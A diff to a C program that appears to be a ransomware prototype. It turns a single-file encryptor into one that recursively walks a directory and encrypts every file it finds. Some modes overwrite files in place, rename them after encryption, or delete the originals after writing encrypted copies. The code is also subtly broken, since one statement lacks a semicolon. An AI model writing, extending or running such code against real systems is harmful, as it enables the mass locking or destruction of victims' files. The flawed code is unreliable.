@@ -3,10 +3,13 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#include <ftw.h>
 #include <signal.h>
 
-int MAX_FILENAME_LENGTH=256;
+int MAX_FILEHANDLES=64;
+int MAX_FILENAME_LENGTH=1024;
 
+//Global mode switch
 typedef enum {
   NO_MODE,
   STEALTH_MODE,
@@ -14,6 +17,7 @@ typedef enum {
   RENAME_MODE,
   TRANSFER_MODE
 } crypt_mode_t;
+crypt_mode_t mode = NO_MODE;
 
 //Set up a global interrupt boolean so that we can quit at the next complete file
 bool signal_interrupt = false;
@@ -37,7 +41,7 @@ void encrypt_buffer(char buffer[], int buflen) {
 }
 
 //Execute an encryption action on a single file, varying by mode.
-int encrypt_file(crypt_mode_t mode, char *filename) {
+int encrypt_file(char *filename) {
   FILE* fp_r;
   FILE* fp_w;
   int num_r;
@@ -64,12 +68,13 @@ int encrypt_file(crypt_mode_t mode, char *filename) {
           fprintf(stderr, "Mismatched read and write!\n");
         }
       }
+      fclose(fp_w);
     break;
     case STEALTH_MODE:
       fprintf(stderr, "Stealth mode detected ...\n");
       fp_r = fopen(filename, "rb");
       if (fp_r == NULL) return EXIT_FAILURE;
-      fp_w = fopen(filename, "wb");
+      fp_w = fopen(filename, "rb+");
       if (fp_w == NULL) return EXIT_FAILURE;
       while (!eof) {
         num_r = fread(buf, 1, sizeof(buf), fp_r);
@@ -77,6 +82,8 @@ int encrypt_file(crypt_mode_t mode, char *filename) {
         if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
         num_w = fwrite(buf, 1, num_r, fp_w);
       }
+      fclose(fp_r);
+      fclose(fp_w);
     break;
     case RENAME_MODE:
       fprintf(stderr, "Rename mode detected ...\n");
@@ -92,7 +99,8 @@ int encrypt_file(crypt_mode_t mode, char *filename) {
           fprintf(stderr, "Mismatched read and write!\n");
         }
       }
-    rename(filename, newfilename);
+      fclose(fp_w);
+      rename(filename, newfilename);
     break;
     case TRANSFER_MODE:
       fprintf(stderr, "Transfer mode detected ...\n");
@@ -106,23 +114,34 @@ int encrypt_file(crypt_mode_t mode, char *filename) {
         if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
         num_w = fwrite(buf, 1, num_r, fp_w);
       }
-    remove(filename);
+      fclose(fp_r);
+      fclose(fp_w);
+      remove(filename);
     break;
   }
 
   return EXIT_SUCCESS;
 }
 
-//Traverse a specified directory, preventing interruptions except between files.
-int encrypt_dir(crypt_mode_t mode, char dir[], int length) {
-  while(true) {
-    printf("Sleeping ...\n");
-    printf("%i\n",sleep(10));
-    if (signal_interrupt) {
-      printf("Stopping now!\n");
-      break;
-    }
+//Callback for ftw library per detected file
+static int file_cb(const char *fpath, const struct stat *sb,
+                    int tflag, struct FTW *ftwbuf) {
+  switch (tflag) {
+  case FTW_F:
+    fprintf(stderr, "Encrypting: %s\n", fpath);
+    encrypt_file(fpath);
+    break;
   }
+  if (signal_interrupt) {
+    fprintf(stderr, "Exiting after file completion.")
+    exit(EXIT_FAILURE);
+  }
+  return EXIT_SUCCESS;
+}
+
+//Traverse a specified directory, preventing interruptions except between files.
+int encrypt_dir(char *dir) {
+  ftw(dir, file_cb, MAX_FILEHANDLES);
   return EXIT_SUCCESS;
 }
 
@@ -133,7 +152,6 @@ void help_exit(char *name) {
 }
 
 int main(int argc, char *argv[]) {
-  crypt_mode_t mode = NO_MODE;
   int opt;
   if (signal(SIGINT, sig_handler) == SIG_ERR) {
     fprintf(stderr, "Error setting up SIGINT handler.\n");
@@ -151,12 +169,5 @@ int main(int argc, char *argv[]) {
   }
   if ( mode == NO_MODE) help_exit(argv[0]);
   if ( optind == argc) help_exit(argv[0]);
-
-//  char buf[] = { 8,16 };
-//  printf("Initial: "); hexprint_array(buf, sizeof(buf)/sizeof(buf[0]));
-//  encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
-//  printf("Final: "); hexprint_array(buf, sizeof(buf)/sizeof(buf[0]));
-
-  return encrypt_file(mode, argv[optind]);
-//  return encrypt_dir(mode, argv[optind]);
+  return encrypt_dir(argv[optind]);
 }
